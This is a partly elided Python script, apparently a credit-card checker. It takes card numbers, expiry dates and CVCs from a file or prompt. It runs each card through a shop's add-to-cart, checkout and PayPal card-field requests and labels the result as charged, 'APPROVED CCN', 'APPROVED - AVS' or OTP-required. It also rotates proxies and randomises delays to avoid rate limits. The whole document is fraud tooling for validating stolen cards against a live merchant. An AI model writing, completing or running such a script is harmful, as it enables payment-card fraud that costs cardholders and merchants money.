...
# Function to set up proxy for a session
...
def process_card(card_input, proxy=None):
    # Parse card details
    parts = card_input.split('|')
    if len(parts) != 4:
        print(f"Invalid card format: {card_input}. Expected: number|mm|yy|cvc")
        return
    ...
    try:
        ...
        print(f"Error in add-to-cart request for {card_input}: {e}")
        return
    ...
    try:
        ...
        print(f"Error in checkout request for {card_input}: {e}")
        return
    ...
    try:
        ...
        print(f"Failed to extract security tokens for {card_input}")
        return
    ...
    try:
        ...
        print(f"Error in update order review for {card_input}: {e}")
        return
    ...
    try:
        ...
        print(f"Failed to extract order ID for {card_input}: {e}")
        return
    ...
    try:
        ...
        print(f"Error in PayPal card fields request for {card_input}: {e}")
        return
    ...
    try:
        ...
        print(f"Error in final payment request for {card_input}: {e}")
        return
    ...
    if ('ADD_SHIPPING_ERROR' in last or
        ...
        'Success ' in last):
        print(f"{card_input} -> CHARGE 2$ ✅")
    elif 'is3DSecureRequired' in last or 'OTP' in last:
        print(f"{card_input} -> OTP 💥")
    elif 'INVALID_SECURITY_CODE' in last:
        print(f"{card_input} -> APPROVED CCN ✅")
    elif 'INVALID_BILLING_ADDRESS' in last:
        print(f"{card_input} -> APPROVED - AVS ✅")
    elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
        print(f"{card_input} -> APPROVED! ✅ - EXISTING_ACCOUNT_RESTRICTED")
    else:
        try:
            message = response.json()['errors'][0]['message']
            code = response.json()['errors'][0]['data'][0]['code']
            print(f"{card_input} -> ({code}: {message})")
        except:
            print(f"{card_input} -> Unknown Error")

# Main function to handle single card or file-based processing
def main():
    use_file = input("Process cards from a file? (y/n): ").strip().lower() == 'y'
    ...
    if use_proxy:
        proxy_choice = input("Use single proxy or proxy list from file? (single/file): ").strip().lower()
        if proxy_choice == 'single':
            single_proxy = input("Enter proxy (e.g., http://user:pass@host:port): ").strip()
        elif proxy_choice == 'file':
            proxy_file = input("Enter proxy file path (e.g., proxies.txt): ").strip()
    ...
    if use_file:
        file_path = input("Enter card file path (e.g., cards.txt): ").strip()
        try:
            with open(file_path, 'r') as f:
                cards = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Card file '{file_path}' not found.")
            return
        except Exception as e:
        ...
        for i, card in enumerate(cards, 1):
            print(f"\nProcessing card {i}/{len(cards)}: {card}")
            proxy = random.choice(proxies) if proxies else single_proxy
            process_card(card, proxy)
            time.sleep(random.uniform(1, 3))  # Random delay to avoid rate-limiting
    else:
        card_input = input("Enter card details (format: number|mm|yy|cvc): ").strip()
        proxy = random.choice(proxies) if proxies else single_proxy
        process_card(card_input, proxy)
